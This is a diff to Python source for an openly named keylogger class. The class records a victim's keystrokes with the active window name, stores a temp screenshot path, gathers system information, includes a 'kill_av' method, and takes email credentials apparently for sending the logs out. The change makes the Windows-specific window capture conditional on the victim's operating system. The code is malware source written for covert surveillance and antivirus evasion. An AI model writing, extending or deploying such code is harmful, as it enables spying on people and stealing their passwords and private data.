@@ -19,7 +19,10 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication 
 from os.path import basename    
 #==============================================================
-import win32gui as w   # Used to Get The Active Window Name
+try:
+    import win32gui as w   # Used to Get The Active Window Name
+except Exception:
+    pass
 
 class Keylogger:
     def __init__(self, time_interval, email, password):
@@ -29,7 +32,8 @@ class Keylogger:
         self.password = password
         self.temp_screenshot = tempfile.gettempdir() + "\\screenshot.png"
         self.system_info = self.get_system_info()
-        self.lastWindow = ""   #Used to Distinguish Log Data
+        self.lastWindow = ""   #Used to Distinguish Log Data 
+        self.victim_system = platform.system()
 
     def kill_av(self):
         try:
@@ -66,11 +70,13 @@ class Keylogger:
 
     def process_key_press(self, key):
         current_key = ""
-        CurrentWindowName = w.GetWindowText(w.GetForegroundWindow())
         
-        if self.lastWindow != CurrentWindowName:
-            self.lastWindow = CurrentWindowName
-            current_key = f"\n\n[OnWard Data Entered In : {CurrentWindowName}]\n"
+        if self.victim_system == 'Windows':        
+            CurrentWindowName = w.GetWindowText(w.GetForegroundWindow())
+        
+            if self.lastWindow != CurrentWindowName:
+                self.lastWindow = CurrentWindowName
+                current_key = f"\n\n[OnWard Data Entered In : {CurrentWindowName}]\n"
             
         try:
             current_key += str(key.char)
